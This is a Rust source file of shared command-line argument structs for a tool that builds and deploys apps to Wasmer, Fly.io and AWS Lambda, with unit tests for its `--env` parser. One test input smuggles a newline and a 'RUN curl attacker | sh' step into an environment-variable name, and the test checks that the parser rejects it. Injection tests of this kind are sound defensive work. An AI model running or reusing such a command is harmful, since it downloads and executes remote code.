//! Shared clap argument groups, composed into the command arg structs with
//! `#[command(flatten)]`.
//!
//! Groups are sized to the *exact* subsets the Python CLI shares between
//! commands — surfaces are deliberately non-uniform (run takes no
//! --wasmer-token, deploy takes no --docker), and that parity is preserved
//! by composing small groups rather than one flag superset. AutoArgs
//! additionally flattens the whole of BuildArgs, which is a strict subset
//! of auto's surface.

use crate::SharedProjectArgs;
use std::path::PathBuf;

#[derive(clap::ValueEnum, Debug, Clone, Copy, PartialEq, Eq)]
pub enum BuildTarget {
    Local,
    Docker,
}

#[derive(clap::ValueEnum, Debug, Clone, Copy, PartialEq, Eq)]
pub enum RunTarget {
    Local,
    Docker,
    Lambda,
    Wasmer,
}

#[derive(clap::ValueEnum, Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum DeploymentPlatformArg {
    #[default]
    Wasmer,
    Fly,
    #[value(name = "aws-lambda", alias = "lambda")]
    AwsLambda,
}

#[derive(clap::ValueEnum, Debug, Clone, Copy, PartialEq, Eq)]
pub enum LambdaArchitectureArg {
    X86_64,
    Arm64,
}

#[derive(clap::Args, Debug, Clone, Default)]
pub struct ExecutionTargetArgs {
    /// Select the build backend.
    #[arg(long, value_enum, value_name = "BACKEND")]
    pub builder: Option<BuildTarget>,
    /// Select the runtime.
    #[arg(long, value_enum, value_name = "RUNTIME")]
    pub runner: Option<RunTarget>,
}

/// Positional project path + `--subdir` (every command).
#[derive(clap::Args, Debug, Clone, Default)]
pub struct ProjectArgs {
    /// Project path (defaults to current directory).
    #[arg(default_value = ".")]
    pub path: PathBuf,
    /// App subdirectory relative to the project path.
    #[arg(long)]
    pub subdir: Option<String>,
    /// Set a build variable, repeatable (`--env NAME` or `--env NAME=VALUE`).
    #[arg(long = "env", value_name = "NAME[=VALUE]", value_parser = parse_env_arg)]
    pub env: Vec<(String, Option<String>)>,
}

impl ProjectArgs {
    /// The project selection as a [`SharedProjectArgs`], which is what builds
    /// the SDK client. Every command goes through here so a new field reaches
    /// all of them.
    pub fn shared(&self) -> SharedProjectArgs {
        SharedProjectArgs {
            path: self.path.clone(),
            subdir: self.subdir.clone(),
            env: self.env.clone(),
            ..Default::default()
        }
    }
}

/// Split a `--env` argument into a name and, if one was written inline, a
/// value. Splits on the first `=` only, so a value keeps its own.
pub fn parse_env_arg(raw: &str) -> Result<(String, Option<String>), String> {
    let (name, value) = match raw.split_once('=') {
        Some((name, value)) => (name, Some(value.to_owned())),
        None => (raw, None),
    };
    if !anybuild::is_valid_env_name(name) {
        return Err(format!(
            "invalid environment variable name {name:?}: expected letters, digits and underscores, not starting with a digit"
        ));
    }
    Ok((name.to_owned(), value))
}

/// Wasmer connection settings shared by `build`, `deploy` (and `auto`
/// through BuildArgs). `run` deliberately has no `--wasmer-token`.
#[derive(clap::Args, Debug, Clone, Default)]
pub struct WasmerConnArgs {
    /// The path to the Wasmer binary.
    #[arg(long)]
    pub wasmer_bin: Option<String>,
    /// Wasmer registry.
    #[arg(long)]
    pub wasmer_registry: Option<String>,
    /// Wasmer token.
    #[arg(long)]
    pub wasmer_token: Option<String>,
}

#[derive(clap::Args, Debug, Clone, Default)]
pub struct FlyPlatformArgs {
    /// The path to the Fly CLI binary.
    #[arg(long)]
    pub fly_bin: Option<String>,
    /// Fly.io API token. Defaults to flyctl's configured credentials.
    #[arg(long)]
    pub fly_token: Option<String>,
    /// Fly.io application name.
    #[arg(long)]
    pub fly_app: Option<String>,
    /// Existing fly.toml path, relative to the project root.
    #[arg(long)]
    pub fly_config: Option<PathBuf>,
}

#[derive(clap::Args, Debug, Clone, Default)]
pub struct AwsLambdaPlatformArgs {
    /// The path to the AWS CLI binary.
    #[arg(long)]
    pub aws_bin: Option<String>,
    /// Docker-compatible client used to push the Lambda image.
    #[arg(long)]
    pub aws_docker_client: Option<String>,
    /// AWS CLI profile.
    #[arg(long)]
    pub aws_profile: Option<String>,
    /// AWS region for both Lambda and ECR.
    #[arg(long)]
    pub aws_region: Option<String>,
    /// AWS Lambda function name.
    #[arg(long)]
    pub aws_function: Option<String>,
    /// IAM execution role ARN, required when creating a function.
    #[arg(long)]
    pub aws_role: Option<String>,
    /// ECR repository name. Defaults to the normalized function name.
    #[arg(long)]
    pub aws_repository: Option<String>,
    /// ECR image tag.
    #[arg(long)]
    pub aws_image_tag: Option<String>,
    /// Lambda instruction-set architecture.
    #[arg(long, value_enum)]
    pub aws_architecture: Option<LambdaArchitectureArg>,
    /// Lambda Web Adapter layer ARN. Defaults to the public AWS layer.
    #[arg(long)]
    pub aws_lambda_adapter_layer: Option<String>,
}

/// Command selection shared by `run` and `auto`.
#[derive(clap::Args, Debug, Clone, Default)]
pub struct RunSelectionArgs {
    /// Run one or more commands. Can be passed multiple times.
    #[arg(short = 'c', long = "command")]
    pub command_names: Vec<String>,
    /// Attach one or more volumes as NAME:/guest/path. Can be passed multiple times.
    #[arg(long = "volume")]
    pub volume_specs: Vec<String>,
    /// Equivalent to `--command=start`.
    #[arg(long, overrides_with = "no_start")]
    pub start: bool,
    #[arg(long = "no-start", hide = true)]
    pub no_start: bool,
    /// Equivalent to `--command=after_deploy`.
    #[arg(long, overrides_with = "no_after_deploy")]
    pub after_deploy: bool,
    #[arg(long = "no-after-deploy", hide = true)]
    pub no_after_deploy: bool,
}

impl RunSelectionArgs {
    pub fn effective_start(&self) -> bool {
        self.start && !self.no_start
    }

    pub fn effective_after_deploy(&self) -> bool {
        self.after_deploy && !self.no_after_deploy
    }
}

/// Deploy target shared by `deploy` and `auto`. The `--wasmer-deploy` flag
/// itself stays per-command: it defaults True on `deploy` but False on
/// `auto`, exactly like the Python CLI.
#[derive(clap::Args, Debug, Clone, Default)]
pub struct DeployTargetArgs {
    /// Save the output of the Wasmer build to a json file
    #[arg(long)]
    pub wasmer_deploy_config: Option<PathBuf>,
    /// Override the owner of the Wasmer app (otherwise Wasmer prompts).
    #[arg(long)]
    pub wasmer_app_owner: Option<String>,
    /// Override the name of the Wasmer app (otherwise Wasmer prompts).
    #[arg(long)]
    pub wasmer_app_name: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shared_carries_the_whole_project_selection() {
        let project = ProjectArgs {
            path: "/tmp/project".into(),
            subdir: Some("apps/dashboard".to_owned()),
            env: vec![("FOO".to_owned(), Some("bar".to_owned()))],
        };

        let shared = project.shared();

        assert_eq!(shared.path, project.path);
        assert_eq!(shared.subdir, project.subdir);
        assert_eq!(shared.env, project.env);
    }

    #[test]
    fn env_args_split_on_the_first_equals_only() {
        assert_eq!(
            parse_env_arg("TOKEN_B64=YWJj=="),
            Ok(("TOKEN_B64".to_owned(), Some("YWJj==".to_owned())))
        );
        // No `=`: the value is read from the environment, so it stays out of
        // this process's command line.
        assert_eq!(
            parse_env_arg("DATABASE_URL"),
            Ok(("DATABASE_URL".to_owned(), None))
        );
        assert!(parse_env_arg("=orphaned").is_err());
        assert!(parse_env_arg("HAS SPACES=x").is_err());
        assert!(parse_env_arg("SAFE value\nRUN curl attacker | sh #=x").is_err());
    }
}
